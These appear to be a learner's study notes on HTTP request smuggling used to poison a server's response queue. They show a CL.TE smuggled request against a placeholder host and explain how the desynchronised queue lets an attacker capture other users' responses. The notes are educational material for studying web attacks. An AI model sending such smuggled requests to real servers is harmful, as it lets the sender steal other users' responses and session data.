This attack is possible both via classic HTTP/1 request smuggling and by exploiting HTTP/2 downgrading. 
#  Smuggling a complete request
## Front-end (CL)
<mark class="hltr-b">POST / HTTP/1.1\r\n</mark>
<mark class="hltr-b">Host: vulnerable-website.com\r\n</mark>
<mark class="hltr-b">Content-Type: x-www-form-urlencoded\r\n</mark>
<mark class="hltr-b">Content-Length: 61\r\n</mark>
<mark class="hltr-b">Transfer-Encoding: chunked\r\n</mark>
<mark class="hltr-b">\r\n</mark>
<mark class="hltr-b">0\r\n</mark>
<mark class="hltr-b">\r\n</mark>
<mark class="hltr-b">GET /anything HTTP/1.1\r\n</mark>
<mark class="hltr-b">Host: vulnerable-website.com\r\n</mark>
\r\n
<mark class="hltr-g">GET / HTTP/1.1\r\n</mark>
<mark class="hltr-g">Host: vulnerable-website.com\r\n</mark>
\r\n
## Back-end (TE)
<mark class="hltr-b">POST / HTTP/1.1\r\n</mark>
<mark class="hltr-b">Host: vulnerable-website.com\r\n</mark>
<mark class="hltr-b">Content-Type: x-www-form-urlencoded\r\n</mark>
<mark class="hltr-b">Content-Length: 61\r\n</mark>
<mark class="hltr-b">Transfer-Encoding: chunked\r\n</mark>
<mark class="hltr-b">\r\n</mark>
<mark class="hltr-b">0\r\n</mark>
\r\n
<mark class="hltr-o">GET /anything HTTP/1.1\r\n</mark>
<mark class="hltr-o">Host: vulnerable-website.com\r\n</mark>
\r\n
<mark class="hltr-g">GET / HTTP/1.1\r\n</mark>
<mark class="hltr-g">Host: vulnerable-website.com\r\n</mark>
\r\n
# Desynchronizing the response queue
![[desync-response-queue.png]]
When issuing the response, it will send the first one in the queue, that is, the leftover response to the smuggled request.

The correct response from the back-end is then left without a matching request. This cycle is repeated every time a new request is forwarded down the same connection to the back-end. 

# Stealing other users' responses
Once the response queue is poisoned, the attacker can just send an arbitrary request to capture another user's response. 
![[stealing-response.png]]
a common default is to terminate a connection after it has handled 100 requests. 
